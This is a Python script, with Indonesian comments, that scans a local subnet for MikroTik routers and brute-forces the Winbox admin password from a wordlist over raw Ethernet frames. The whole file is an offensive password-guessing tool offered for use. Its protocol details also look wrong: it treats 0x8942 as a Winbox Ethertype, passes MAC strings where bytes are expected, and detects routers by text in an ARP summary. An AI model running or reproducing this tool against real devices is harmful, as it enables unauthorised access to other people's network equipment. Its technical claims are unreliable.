import socket
import struct
import sys
import threading
from scapy.all import ARP, Ether, srp

# Winbox protocol constants
WINBOX_PORT = 0x8942  # Ethertype for Winbox
INTERFACE = "eth0"    # Sesuaikan interface

# Buat Ethernet socket
def create_socket(interface):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((interface, WINBOX_PORT))
    return s

# Bangun paket Winbox login request
def build_login_packet(username, password):
    # Header dasar Winbox
    header = struct.pack('<HBB', 0x0101, 0x01, 0x00)  # Login command
    user = username.encode('utf-8') + b'\x00'
    pwd = password.encode('utf-8') + b'\x00'
    payload = b'\x01\x06' + user + b'\x02\x06' + pwd
    packet = header + payload
    return packet

# Kirim dan terima balasan Winbox
def send_winbox_packet(sock, src_mac, dst_mac, packet):
    eth_header = struct.pack('<6s6sH', dst_mac, src_mac, WINBOX_PORT)
    full_packet = eth_header + packet
    sock.send(full_packet)

    # Terima respons
    raw_data, _ = sock.recvfrom(65535)
    return raw_data[14:]  # Hilangkan Ethernet header

# Deteksi apakah login berhasil
def is_login_success(response):
    if len(response) < 3:
        return False
    cmd = response[0]
    status = response[2]
    return cmd == 0x01 and status == 0x00  # Login sukses jika stat=0x00

# Fungsi brute force password
def winbox_bruteforce(target_mac, interface, username, wordlist_path):
    sock = create_socket(interface)
    src_mac = get_own_mac(interface)

    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f.readlines()]

    print(f"[+] Mencoba {len(passwords)} password untuk {target_mac}")
    for password in passwords:
        print(f"[~] Mencoba: {password}")
        try:
            packet = build_login_packet(username, password)
            response = send_winbox_packet(sock, src_mac, target_mac, packet)
            if is_login_success(response):
                print(f"[!] BERHASIL! Password ditemukan: {password}")
                return password
        except Exception as e:
            print(f"[x] Error: {e}")
            continue
    print("[-] Password tidak ditemukan.")
    return None

# Dapatkan MAC address sendiri
def get_own_mac(interface):
    from scapy.all import get_if_hwaddr
    return bytes.fromhex(get_if_hwaddr(interface).replace(':', ''))

# Scan jaringan cari MikroTik
def scan_mikrotik(interface):
    print(f"[+] Scanning network on {interface}...")
    devices = []
    arp_request = ARP(pdst="192.168.88.0/24")  # Sesuaikan subnet
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=0, iface=interface)[0]

    for _, received in result:
        if "MikroTik" in received.summary():
            print(f"[+] MikroTik ditemukan: {received.hwsrc}")
            devices.append(received.hwsrc)
    return devices

# Menu utama
def main():
    interface = input("Masukkan interface (contoh: eth0): ") or INTERFACE
    username = input("Username Winbox (default: admin): ") or "admin"
    wordlist = input("Path ke wordlist: ")

    targets = scan_mikrotik(interface)
    if not targets:
        print("[-] Tidak ada perangkat MikroTik ditemukan.")
        return

    target_mac = targets[0]
    print(f"[+] Mulai brute force pada {target_mac}")
    result = winbox_bruteforce(target_mac, interface, username, wordlist)
    if result:
        print(f"[SUCCESS] Password ditemukan: {result}")
    else:
        print("[!] Gagal menemukan password.")

if __name__ == "__main__":
    main()